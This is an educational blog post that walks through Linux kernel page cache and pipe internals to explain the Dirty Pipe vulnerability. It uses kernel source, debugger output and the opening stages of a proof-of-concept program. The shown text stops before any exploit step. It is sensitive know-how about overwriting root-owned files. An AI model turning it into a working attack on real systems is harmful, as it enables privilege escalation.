&lt;p>This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described &lt;a href="https://dirtypipe.cm4all.com/">here&lt;/a>. If you haven&amp;rsquo;t read the original publication yet, we&amp;rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&amp;rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&amp;rsquo;s going on we&amp;rsquo;d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source">elixir.bootlin.com&lt;/a>, version 5.17.9) and a kernel debugging setup (derived from &lt;a href="https://github.com/martinclauss/linux-kernel-debugging">linux-kernel-debugging&lt;/a>). The Dirty Pipe-specific debugging setup and the PoC code is provided in a &lt;a href="https://github.com/vobst/lkd-cve">GitHub&lt;/a> repository.&lt;/p>
&lt;h2 id="our-goal--disclaimer">Our Goal / Disclaimer&lt;/h2>
&lt;p>It&amp;rsquo;s important to talk about the goal of our investigation first:&lt;/p>
&lt;ul>
&lt;li>Do we want to understand how the Linux kernel works in general? Maybe not right now&amp;hellip;&lt;/li>
&lt;li>Do we want to know what the vulnerability is? Why it occurs? How it can be exploited? Yes!&lt;/li>
&lt;/ul>
&lt;p>It is important to keep in mind, what we want to achieve. The Linux kernel is a &lt;strong>very&lt;/strong> complex piece of software. We have to leave some blind spots, but that&amp;rsquo;s &lt;strong>absolutely okay&lt;/strong> :)&lt;/p>
&lt;p>Thus, when we show kernel source code we will often hide parts that are not directly relevant for our discussion to improve readability. In general, those parts may very well be security-relevant and we encourage you to follow the links to review the original code. In particular, if you want to find your own vulnerabilities or become a kernel hacker you should spend more time to understand (all) the mechanisms and details! ;)&lt;/p>
&lt;h2 id="page-cache">Page Cache&lt;/h2>
&lt;p>The page cache plays an important role in the Dirty Pipe vulnerability so let&amp;rsquo;s see what it is and how it works first.&lt;/p>
&lt;blockquote>
&lt;p>The physical memory is volatile and the common case for getting data into the memory is to read it from files. Whenever a file is read, the data is put into the page cache to avoid expensive disk access on the subsequent reads. Similarly, when one writes to a file, the data is placed in the page cache and eventually gets into the backing storage device. The written pages are marked as dirty and when Linux decides to reuse them for other purposes, it makes sure to synchronize the file contents on the device with the updated data. &lt;a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html#page-cache">source&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>In particular, the above means that if any process on the system (or the kernel itself) requests data from a file that is already cached, the cached data is used instead of accessing the disk. Of course there are ways to influence this behavior by using flags (&lt;code>O_DIRECT | O_SYNC&lt;/code>) when opening a file, or by explicitly instructing the kernel to &lt;code>sync&lt;/code>hronize dirty pages. You could also discard the cached pages using the &lt;code>sysfs&lt;/code> pseudo file system: &lt;code># echo 1 &amp;gt; /proc/sys/vm/drop_caches&lt;/code>. However, in most situations the cached data is what is ultimately used by the kernel (and thus also the user processes).&lt;/p>
&lt;p>At this point we can already tease what the Dirty Pipe vulnerability is all about: It will allow us to overwrite the cached data of any file that we are allowed to &lt;strong>open&lt;/strong> (read-only access is sufficient), without the page cache actually marking the overwritten page as &amp;lsquo;dirty&amp;rsquo;. Thus, we can trick the system into thinking that the file contents changed (at least for a while) without leaving traces on disk.&lt;/p>
&lt;p>But let&amp;rsquo;s not get ahead of ourselves, the goal is after all to understand &lt;em>why&lt;/em> this happens. As we can see, the first thing our PoC does, is opening a file for reading, without any additional flags.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> tfd;
...
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to open() file&amp;#34;&lt;/span>);
tfd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./target_file&amp;#34;&lt;/span>, O_RDONLY);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L61">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The kernel function handling our &lt;code>open&lt;/code> user space call is &lt;code>do_sys_openat2()&lt;/code>. It attempts to get the file in the desired mode, and if everything succeeds it installs a new file descriptor that is backed by the file and returns it (the file descriptor is just an &lt;code>int&lt;/code>eger).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>
&lt;span style="color:#a6e22e">do_sys_openat2&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> dfd, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">struct&lt;/span> open_how &lt;span style="color:#f92672">*&lt;/span>how)
{
&lt;span style="color:#66d9ef">struct&lt;/span> open_flags op;
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> build_open_flags(how, &lt;span style="color:#f92672">&amp;amp;&lt;/span>op);
&lt;span style="color:#66d9ef">struct&lt;/span> filename &lt;span style="color:#f92672">*&lt;/span>tmp;
...
tmp &lt;span style="color:#f92672">=&lt;/span> getname(filename);
...
fd &lt;span style="color:#f92672">=&lt;/span> get_unused_fd_flags(how&lt;span style="color:#f92672">-&amp;gt;&lt;/span>flags);
...
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> do_filp_open(dfd, tmp, &lt;span style="color:#f92672">&amp;amp;&lt;/span>op); &lt;span style="color:#75715e">// lolcads: maybe follow ...
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// but don&amp;#39;t get lost ;)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>...
&lt;span style="color:#66d9ef">if&lt;/span> (IS_ERR(f)) { &lt;span style="color:#75715e">// lolcads: e.g. permission checks failed, doesn&amp;#39;t exist...
&lt;/span>&lt;span style="color:#75715e">&lt;/span> put_unused_fd(fd);
fd &lt;span style="color:#f92672">=&lt;/span> PTR_ERR(f);
} &lt;span style="color:#66d9ef">else&lt;/span> {
fsnotify_open(f);
fd_install(fd, f);
}
putname(tmp);
&lt;span style="color:#66d9ef">return&lt;/span> fd; &lt;span style="color:#75715e">// lolcads: breakpoint 1
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1198">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Following the call to &lt;code>do_filp_open()&lt;/code> bears the danger of getting lost in the jungle of the (virtual) file system. To avoid going down that rabbit hole we place our first breakpoint on the &lt;code>return&lt;/code> statement. This gives us the opportunity to find the &lt;code>struct file&lt;/code> that is backing the file descriptor our PoC process receives.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> file {
...
&lt;span style="color:#66d9ef">struct&lt;/span> path f_path;
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>f_inode;
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations &lt;span style="color:#f92672">*&lt;/span>f_op;
...
&lt;span style="color:#66d9ef">struct&lt;/span> address_space &lt;span style="color:#f92672">*&lt;/span>f_mapping;
...
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L956">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Importantly, the &lt;code>f_mapping&lt;/code> field leads us to the &lt;code>struct address_space&lt;/code> that represents the page cache object associated to the file. The &lt;code>a_ops&lt;/code> field points to implementations of typical operations one might want to perform on a page cache object e.g., reading ahead, marking pages as dirty or writing back dirty pages, and so on.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> address_space {
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>host;
&lt;span style="color:#66d9ef">struct&lt;/span> xarray i_pages;
...
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> nrpages;
pgoff_t writeback_index;
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> address_space_operations &lt;span style="color:#f92672">*&lt;/span>a_ops;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> flags;
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L450">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The actual cached data lies on one or more pages somewhere in physical memory. Each and every page of physical memory is described by a &lt;code>struct page&lt;/code>. An &lt;a href="https://lwn.net/Articles/745073/">extendable array&lt;/a> (&lt;code>struct xarray&lt;/code>) containing pointers to those page structs can be found in the &lt;code>i_pages&lt;/code> field of the &lt;code>struct address_space&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> page {
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> flags;
...
&lt;span style="color:#75715e">/* Page cache and anonymous pages */&lt;/span>
&lt;span style="color:#66d9ef">struct&lt;/span> address_space &lt;span style="color:#f92672">*&lt;/span>mapping;
pgoff_t index; &lt;span style="color:#75715e">/* Our offset within mapping. */&lt;/span>
...
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * If the page can be mapped to userspace, encodes the number
&lt;/span>&lt;span style="color:#75715e"> * of times this page is referenced by a page table.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
atomic_t _mapcount;
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * If the page is neither PageSlab nor mappable to userspace,
&lt;/span>&lt;span style="color:#75715e"> * the value stored here may help determine what this page
&lt;/span>&lt;span style="color:#75715e"> * is used for. See page-flags.h for a list of page types
&lt;/span>&lt;span style="color:#75715e"> * which are currently stored here.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> page_type;
...
&lt;span style="color:#75715e">/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */&lt;/span>
atomic_t _refcount;
...
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * On machines where all RAM is mapped into kernel address space,
&lt;/span>&lt;span style="color:#75715e"> * we can simply calculate the virtual address. On machines with
&lt;/span>&lt;span style="color:#75715e"> * highmem some memory is mapped into kernel virtual memory
&lt;/span>&lt;span style="color:#75715e"> * dynamically, so we need a place to store that address.
&lt;/span>&lt;span style="color:#75715e"> * Note that this field could be 16 bits on x86 ... ;)
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * Architectures with slow multiplication can define
&lt;/span>&lt;span style="color:#75715e"> * WANT_PAGE_VIRTUAL in asm/page.h
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>virtual; &lt;span style="color:#75715e">/* Kernel virtual address (NULL if
&lt;/span>&lt;span style="color:#75715e"> not kmapped, ie. highmem) */&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm_types.h#L72">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The last comment gives a hint at how to find the actual page of physical memory described by this struct within the kernel&amp;rsquo;s virtual address space. (The kernel maps all of physical memory into its virtual address space so we know its &lt;em>somewhere&lt;/em>. Refer to the &lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/Documentation/x86/x86_64/mm.rst">documentation&lt;/a> for more details.)&lt;/p>
&lt;pre tabindex="0">&lt;code>========================================================================================================================
Start addr | Offset | End addr | Size | VM area description
========================================================================================================================
...
ffff888000000000 | -119.5 TB | ffffc87fffffffff | 64 TB | direct mapping of all physical memory (page_offset_base)
...
&lt;/code>&lt;/pre>&lt;p>The key to finding the &amp;lsquo;needle in the haystack&amp;rsquo; is another region of the kernel&amp;rsquo;s virtual address space.&lt;/p>
&lt;blockquote>
&lt;p>The sparse vmemmap uses a virtually mapped memory map to optimize pfn_to_page and page_to_pfn operations. There is a global struct page *vmemmap pointer that points to a virtually contiguous array of struct page objects. A PFN is an index to that array and the offset of the struct page from vmemmap is the PFN of that page. &lt;a href="https://www.kernel.org/doc/html/latest/vm/memory-model.html">source&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>========================================================================================================================
Start addr | Offset | End addr | Size | VM area description
========================================================================================================================
...
ffffe90000000000 | -23 TB | ffffe9ffffffffff | 1 TB | ... unused hole
ffffea0000000000 | -22 TB | ffffeaffffffffff | 1 TB | virtual memory map (vmemmap_base)
ffffeb0000000000 | -21 TB | ffffebffffffffff | 1 TB | ... unused hole
...
&lt;/code>&lt;/pre>&lt;p>In the debugger we can confirm that the address of the &lt;code>struct page&lt;/code> associated to the &lt;code>struct address_space&lt;/code> of the &lt;code>target_file&lt;/code> our &lt;code>poc&lt;/code> process opened indeed lies within this range.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct task_struct at 0xffff888103a71c80
&amp;gt; 'pid': 231
&amp;gt; 'comm': &amp;quot;poc&amp;quot;, '\000' &amp;lt;repeats 12 times&amp;gt;
struct file at 0xffff8881045b0800
&amp;gt; 'f_mapping': 0xffff8881017d9460
&amp;gt; filename: target_file
struct address_space at 0xffff8881017d9460
&amp;gt; 'a_ops': 0xffffffff82226ce0 &amp;lt;ext4_aops&amp;gt;
&amp;gt; 'i_pages.xa_head' : 0xffffea0004156880 &amp;lt;- here!
&lt;/code>&lt;/pre>&lt;p>The kernel implements the translation of this address into a position in the contiguous mapping of all physical memory using a series of macros that hide behind a call to &lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm.h#L1712">&lt;code>lowmem_page_address / page_to_virt&lt;/code>&lt;/a>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define page_to_virt(x) __va(PFN_PHYS(page_to_pfn(x)))
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define page_to_pfn __page_to_pfn
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define __page_to_pfn(page) (unsigned long)((page) - vmemmap) &lt;/span>&lt;span style="color:#75715e">// (see .config: CONFIG_SPARSEMEM_VMEMMAP=y)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define vmemmap ((struct page *)VMEMMAP_START)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e"># define VMEMMAP_START vmemmap_base &lt;/span>&lt;span style="color:#75715e">// (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define PFN_PHYS(x) ((phys_addr_t)(x) &amp;lt;&amp;lt; PAGE_SHIFT)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define PAGE_SHIFT 12
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define __va(x) ((void *)((unsigned long)(x)+PAGE_OFFSET))
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define PAGE_OFFSET ((unsigned long)__PAGE_OFFSET)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define __PAGE_OFFSET page_offset_base &lt;/span>&lt;span style="color:#75715e">// (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When following the macros, make sure to consider your architecture (e.g., x86) and check for compile time definitions in the &lt;code>.config&lt;/code> file of your build (e.g., &lt;code>CONFIG_DYNAMIC_MEMORY_LAYOUT=y&lt;/code>). The values of &lt;code>vmemmap_base&lt;/code> and &lt;code>page_offset_base&lt;/code> are in general effected by &lt;a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#Kernel_address_space_layout_randomization">KASLR&lt;/a> but can be determined at runtime e.g., by using the debugger.&lt;/p>
&lt;p>Equipped with this knowledge, we can &lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_scripts_gdb/lkd/structs.py#L158">script the debugger&lt;/a> to do this calculation for us and print the cached data of the file we opened.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct page at 0xffffea0004156880
&amp;gt; virtual: 0xffff8881055a2000
&amp;gt; data: b'File owned by root!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
&lt;/code>&lt;/pre>&lt;p>Inspecting the file permissions confirms that we are indeed not allowed to write to it.&lt;/p>
&lt;p>&lt;code>-rw-r--r-- 1 root root 20 May 19 20:15 target_file&lt;/code>&lt;/p>
&lt;p>Next, we are going to explore the second kernel subsystem involved in the Dirty Pipe vulnerability.&lt;/p>
&lt;h2 id="pipes-general">Pipes (general)&lt;/h2>
&lt;p>Pipes are a unidirectional inter-process communication (IPC) mechanism found in UNIX-like operating systems. In essence, a pipe is a buffer in kernel space that is accessed by processes through file descriptors. Unidirectionality means that there are two types of file descriptors, &lt;em>read&lt;/em> and &lt;em>write&lt;/em> ones:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> pipefds[&lt;span style="color:#ae81ff">2&lt;/span>];
pipe(pipefds);
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code> ┌───────────────────┐
write() ---&amp;gt; pipefds[1] │&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;│ pipefds[0] ---&amp;gt; read()
└───────────────────┘
&lt;/code>&lt;/pre>&lt;p>Upon creating a pipe the calling process receives both file descriptors, but usually it proceeds by distributing one or both of the file descriptors to other processes (e.g., by &lt;code>fork/clone&lt;/code>ing or through UNIX domain &lt;code>socket&lt;/code>s) to facilitate IPC. They are, for example, used by shells to connect stdout and stdin of the launched sub-processes.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ strace -f sh -c 'echo &amp;quot;Hello world&amp;quot; | wc' 2&amp;gt;&amp;amp;1 | grep -E &amp;quot;(pipe|dup2|close|clone|execve|write|read)&amp;quot;
...
sh: pipe([3, 4]) = 0 // parent shell creates pipe
sh: clone(...) // spawn child shell that will do echo (build-in command)
sh: close(4) = 0 // parent shell does not need writing end anymore
echo sh: close(3) // close reading end
echo sh: dup2(4, 1) = 0 // set stdout equal to writing end
echo sh: close(4) // close duplicate writing end
echo sh: write(1, &amp;quot;Hello world\n&amp;quot;, 12) = 12 // child shell performs write to pipe
...
sh: clone(...) // spawn child shell that will later execve wc
sh: close(3) = 0 // parent shell does not need reading end anymore
...
wc sh: dup2(3, 0) = 0 // set stdin equal to reading end
wc sh: close(3) = 0 // close duplicate reading end
wc sh: execve(&amp;quot;/usr/bin/wc&amp;quot;, [&amp;quot;wc&amp;quot;],...) // exec wc
wc: read(0, &amp;quot;Hello world\n&amp;quot;, 16384) = 12 // wc reads from pipe
...
&lt;/code>&lt;/pre>&lt;p>We mostly care about anonymous pipes as seen in the example above but there are also named pipes (see, e.g., &lt;a href="https://www.linuxjournal.com/article/2156">here&lt;/a>)&lt;/p>
&lt;p>Check out the excellent book &lt;em>The Linux Programming Interface&lt;/em> by Michael Kerrisk, Chapter 44 &amp;ldquo;Pipes and FIFOs&amp;rdquo; for more information and examples.&lt;/p>
&lt;h2 id="pipes-initialization">Pipes (initialization)&lt;/h2>
&lt;p>After opening the target file, our PoC process proceeds by creating a pipe:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> pipefds[&lt;span style="color:#ae81ff">2&lt;/span>];
...
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to create pipe()&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (pipe(pipefds)) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L70">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Let&amp;rsquo;s investigate what the kernel does to provide the pipe functionality.&lt;/p>
&lt;h3 id="overview">Overview&lt;/h3>
&lt;p>Our system call is handled by the kernel function &lt;code>do_pipe2&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">SYSCALL_DEFINE1(pipe, &lt;span style="color:#66d9ef">int&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>, fildes)
{
&lt;span style="color:#66d9ef">return&lt;/span> do_pipe2(fildes, &lt;span style="color:#ae81ff">0&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1026">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">do_pipe2&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>fildes, &lt;span style="color:#66d9ef">int&lt;/span> flags)
{
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>files[&lt;span style="color:#ae81ff">2&lt;/span>];
&lt;span style="color:#66d9ef">int&lt;/span> fd[&lt;span style="color:#ae81ff">2&lt;/span>];
&lt;span style="color:#66d9ef">int&lt;/span> error;
error &lt;span style="color:#f92672">=&lt;/span> __do_pipe_flags(fd, files, flags);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>error) {
&lt;span style="color:#66d9ef">if&lt;/span> (unlikely(copy_to_user(fildes, fd, &lt;span style="color:#66d9ef">sizeof&lt;/span>(fd)))) {
fput(files[&lt;span style="color:#ae81ff">0&lt;/span>]);
fput(files[&lt;span style="color:#ae81ff">1&lt;/span>]);
put_unused_fd(fd[&lt;span style="color:#ae81ff">0&lt;/span>]);
put_unused_fd(fd[&lt;span style="color:#ae81ff">1&lt;/span>]);
error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>EFAULT;
} &lt;span style="color:#66d9ef">else&lt;/span> {
fd_install(fd[&lt;span style="color:#ae81ff">0&lt;/span>], files[&lt;span style="color:#ae81ff">0&lt;/span>]);
fd_install(fd[&lt;span style="color:#ae81ff">1&lt;/span>], files[&lt;span style="color:#ae81ff">1&lt;/span>]);
}
}
&lt;span style="color:#66d9ef">return&lt;/span> error;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1004">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Here we can see that two integer file descriptors, backed by two distinct files, are created. One for the reading &lt;code>fd[0]&lt;/code>, and one for the writing &lt;code>fd[1]&lt;/code> end of the pipe. The descriptors are also copied from the kernel to user space &lt;code>copy_to_user(fildes, fd, sizeof(fd))&lt;/code>, where &lt;code>fildes&lt;/code> is the user space pointer we specified with the call to &lt;code>pipe(pipefds)&lt;/code> in our PoC.&lt;/p>
&lt;p>Following the call to &lt;code>__do_pipe_flags()&lt;/code> reveals which data structures the kernel uses to implement our pipe. We summarized the relevant structures and their relationships in the following figure:&lt;/p>
&lt;pre tabindex="0">&lt;code> ┌──────────────────┐
┌──────────────────────┐ ┌►│struct pipe_buffer│
┌────────────────────────┐ ┌──►│struct pipe_inode_info│ │ │... │
┌───► │struct file │ │ │ │ │ │page = Null │
│ │ │ │ │... │ │ │... │
File desciptor table │ │... │ │ │ │ │ ├──────────────────┤
│ │ │ │ │head = 0 │ │ │struct pipe_buffer│
int fd │ struct file *f │ │f_inode ───────────────┼──┐ │ │ │ │ │... │
──────────┼───────────────── │ │ │ │ │ │tail = 0 │ │ │page = Null │
... │ ... │ │fmode = O_RDONLY | ... │ │ ┌─────────────┐ │ │ │ │ │... │
│ │ │ │ ├─►│struct inode │ │ │ring_size = 16 │ │ ├──────────────────┤
pipefd_r │ f_read ──────┘ │... │ │ │ │ │ │ │ │ │ ... │
│ └────────────────────────┘ │ │... │ │ │... │ │ ├──────────────────┤
pipefd_w │ f_write ──────┐ │ │ │ │ │ │ │ │struct pipe_buffer│
│ │ ┌────────────────────────┐ │ │i_pipe ─────┼─┘ │bufs ─────────────────┼──┘ │... │
... │ ... └───► │struct file │ │ │ │ │ │ │page = Null │
│ │ │ │ │... │ │... │ │... │
│ │... │ │ │ │ └──────────────────────┘ └──────────────────┘
│ │ │ │i_fop ──────┼─┐
│f_inode ───────────────┼──┘ │ │ │ ┌─────────────────────────────────────┐
│ │ │... │ └──►│struct file_operations │
│fmode = O_WRONLY | ... │ └─────────────┘ │ │
│ │ │... │
│... │ │ │
└────────────────────────┘ │read_iter = pipe_read │
│ │
│write_iter = pipe_write │
│ │
│... │
│ │
│splice_write = iter_file_splice_write│
│ │
│... │
└─────────────────────────────────────┘
&lt;/code>&lt;/pre>&lt;p>The two integer file descriptors, representing the pipe in user space, are backed by two &lt;code>struct file&lt;/code>s that only differ in their permission bits. In particular, they both refer to the same &lt;code>struct inode&lt;/code>.&lt;/p>
&lt;blockquote>
&lt;p>The inode (index node) is a data structure in a Unix-style file system that describes a file-system object such as a file or a directory. Each inode stores the attributes and disk block locations of the object&amp;rsquo;s data. File-system object attributes may include metadata (times of last change, access, modification), as well as owner and permission data.
[&amp;hellip;]
A directory is a list of inodes with their assigned names. The list includes an entry for itself, its parent, and each of its children. &lt;a href="https://en.wikipedia.org/wiki/Inode">source&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>The &lt;code>i_fop&lt;/code> field of the inode contains a pointer to a &lt;code>struct file_operations&lt;/code>. This structure holds function pointers to the implementations of the various operations that can be performed on the pipe. Importantly, those include the functions the kernel will use to handle a process' request to &lt;code>read()&lt;/code> or &lt;code>write()&lt;/code> the pipe.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations pipefifo_fops &lt;span style="color:#f92672">=&lt;/span> {
.open &lt;span style="color:#f92672">=&lt;/span> fifo_open,
.llseek &lt;span style="color:#f92672">=&lt;/span> no_llseek,
.read_iter &lt;span style="color:#f92672">=&lt;/span> pipe_read,
.write_iter &lt;span style="color:#f92672">=&lt;/span> pipe_write,
.poll &lt;span style="color:#f92672">=&lt;/span> pipe_poll,
.unlocked_ioctl &lt;span style="color:#f92672">=&lt;/span> pipe_ioctl,
.release &lt;span style="color:#f92672">=&lt;/span> pipe_release,
.fasync &lt;span style="color:#f92672">=&lt;/span> pipe_fasync,
.splice_write &lt;span style="color:#f92672">=&lt;/span> iter_file_splice_write,
};
